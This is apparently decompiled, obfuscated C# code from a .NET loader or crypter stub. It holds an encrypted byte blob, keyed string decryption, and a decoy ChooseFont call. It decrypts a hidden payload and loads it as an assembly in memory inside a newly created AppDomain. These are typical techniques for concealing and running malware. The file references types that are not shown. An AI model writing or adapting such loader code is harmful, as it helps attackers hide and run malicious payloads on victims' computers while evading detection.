using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Policy;
using h13;

namespace h;

internal sealed class E
{
	internal sealed class W
	{
		public string Q;

		internal static H x/* Not supported: data(FA D7 6C B4 5F 01 3D 11 8E BF 1A E2 E0 16 03 16 B5 1B 9F D3 E2 3E C9 8A 10 23 C6 8C 1B 5E F2 46 28 4E 11 CB 20 E8 17 8F CF 02 DF 99 0B 72 3F F8 11 5C 67 50 0E 85 70 3A FE 2C 6C A5 0D 68 AA CF 9D 5A 53 71 72 D0 41 D4 34 3F 84 C9 CE D6 3E CE 4C B5 A1 38 52 0A 57 B0 A6 4D 6C 04 D9 6B FA 0E DC 79 A2 6C 25 85 79 7F 20 D1 5B AB 5F CD 1B 3E 61 42 1F 09 2A B5 27 6F 0C 5D 6E DC 04 E9 48 76 92 6B 36 6F 2B 30 BB B1 53 BC D9 89 BD 07 A2 84 42 F4 E2 19 CA D9 2C CA 8D 8F B3 C1 99 AA A4 57 8D E4 13 76 93 C0 5A C0 46 20 93 E8 89 FE 40 AF F2 A3 56 92 DF 91 15 36 59 14 A6 67 31 71 DC D8 9B 4F 08 94 C5 44 6E DE 3F D4 1C BA A5 52 01 F0 E5 64 82 00 35 8B 3E B7 90 D1 32 03 8D AE AC 80 85 5E 85 5D 98 8A F7 E6 DB 1B AA 28 01 56 FD 82 AC 70 E9 80 C8 0D FC 29 F8 F7 A7 D1 49 70 9B 8C AF A8 ED 00 91 7A 83 FB ED 7C 29 CC 63 83 71 2A 6E 23 91 D0 74 5B C3 1F 5E 5D 4A 47 AF DD C0 A0 C8 E3 33 11 8F D7 D3 B6 0D DD 38 8A 01 BD F1 26 06 3E C6 C1 C2 6D 56 53 53 AC A9 28 07 F8 3C 93 38 90 98 FE 8E 0E A2 D0 A0 88 08 B3 BE 03 5B 92 20 DA 27 60 89 C3 48 4B 34 CD 3E 36 9F 25 61 29 39 A3 07 6D 32 46 C5 E6 17 FA 74 B9 8D AF 76 1E EB 43 9F 53 7C BD 26 BB 66 5E 0D 30 1D 7E C3 FA 88 D8 37 C8 89 8F C4 5E BC 38 0C 0D 20 18 C0 30 74 0D 33 45 B1 DC E5 7C AD C6 B8 71 BC 59 C8 07 27 9C 60 44 1C B0 4B 3F 75 E2 42 11 24 99 C2 D6 0B 4F 16 F0 B7 8C 00 35 8B F5 97 48 F4 33 13 AA 09 E2 C5 C8 BF 72 FC 04 B3 A6 D9 C6 A4 F0 2C 96 E6 54 72 15 51 D9 E3 B4 C2 DC A7 32 C8 57 31 D2 E2 F9 B3 B5 FE 1E 06 1A F0 7F D1 3E 4E 18 46 C7 12 2F C5 B8 B9 0F A4 48 54 80 1E E3 34 3B DB C4 3F 11 9E 32 DB 9A E7 FD F8 FE BF 54 14 61 4D D5 BA 53 EF 19 63 EA 02 CD F0 37 3F E4 FF F9 63 1C 4E 98 84 BA 1D 3B D7 3F 99 29 EE 19 22 2A 38 A3 77 B0 78 AB E8 D5 EC ED 20 B7 00 A8 D8 15 C6 71 3D DA 75 14 A3 A3 24 AA CB 97 DF 59 38 D3 22 A5 9F 54 B0 49 4A C6 01 66 6C 54 4A 4B 56 8F D2 4A C5 BE 54 F3 54 B0 CE C5 01 A8 5B FB 42 9B 50 F7 7B 08 A2 F7 70 4D 80 53 D5 7E 26 73 2D 1E B9 AB 17 04 9C 78 C4 F2 7A 23 9C 40 DA 4F 97 84 6E 3E 4B E7 F9 95 36 EB E8 DF A2 53 20 C4 CB 4E 2C 65 21 1C 16 8B 26 2F CA C3 AA F7 08 50 C4 C9 E0 DE 32 79 52 AC A8 A1 27 A0 6F 0C B7 7F 4D 26 78 E1 83 2B 90 1A E9 61 CE DB 85 58 DB 6B 35 0A EA 6E BD 6E E5 71 82 DE 08 12 25 10 58 BB AD A3 5A 44 D6 A8 42 E8 5E 37 BD F3 FF 43 61 5A 0D B4 0E B4 D7 AE E3 13 46 AA 48 94 31 AE 6E E4 FF 31 93 67 AB 6F BD 09 65 B4 12 39 36 62 FC 72 A7 0C 45 B0 E0 80 3A C0 0C 55 C4 85 85 71 BB B7 BB CE D8 BD A4 08 4E 5D 50 F7 2B 24 59 48 8E 32 79 9D 20 D1 81 66 DA AD F6 2C A1 44 94 C1 EC 75 B8 C0 4E 8A E5 3F EE 76 5C A2 67 06 F3 06 9B 6A) */;

		internal static char[] k;
	}

	[DllImport("comdlg32.dll", CharSet = CharSet.Auto, EntryPoint = "ChooseFont", SetLastError = true)]
	public static extern bool C(IntPtr P_0);

	private static void a()
	{
		int num = 0;
		Array array = default(Array);
		while (true)
		{
			switch (num)
			{
			default:
				array = o();
				break;
			case 2:
			case 4:
				break;
			case 1:
			{
				AppDomain currentDomain = AppDomain.CurrentDomain;
				IReflect typeFromHandle = typeof(AssmeblyLoader);
				new W().Q = Resource1.F.L(12, 532023659, 0);
				IntPtr intPtr = Marshal.AllocHGlobal(0);
				CHOOSEFONT cHOOSEFONT = default(CHOOSEFONT);
				cHOOSEFONT.lStructSize = Marshal.SizeOf((object)cHOOSEFONT);
				cHOOSEFONT.nSizeMin = 64;
				cHOOSEFONT.nSizeMax = 64;
				cHOOSEFONT.Flags = 33751233;
				cHOOSEFONT.lpLogFont = intPtr;
				IntPtr intPtr2 = Marshal.AllocHGlobal(Marshal.SizeOf((object)cHOOSEFONT));
				Marshal.StructureToPtr((object)cHOOSEFONT, intPtr2, fDeleteOld: false);
				Marshal.FreeHGlobal(intPtr2);
				Marshal.FreeHGlobal(intPtr);
				((IAssemblyLoader)currentDomain.CreateInstanceFromAndUnwrap((typeFromHandle as Type).Assembly.Location, ((Type)typeFromHandle).FullName ?? throw new InvalidOperationException())).Load(array as byte[]);
				return;
			}
			}
			string text = Resource1.F.L(9, 532023624, 7);
			AppDomainSetup appDomainSetup = new AppDomainSetup();
			appDomainSetup.set_ShadowCopyFiles(Resource1.F.L(6, 532023633, 3));
			appDomainSetup.set_LoaderOptimization(LoaderOptimization.DomainMask);
			AppDomain.CreateDomain(text, (Evidence)null, appDomainSetup);
			num = 1;
		}
	}

	private static byte[] o()
	{
		return j.M(n.d());
	}
}
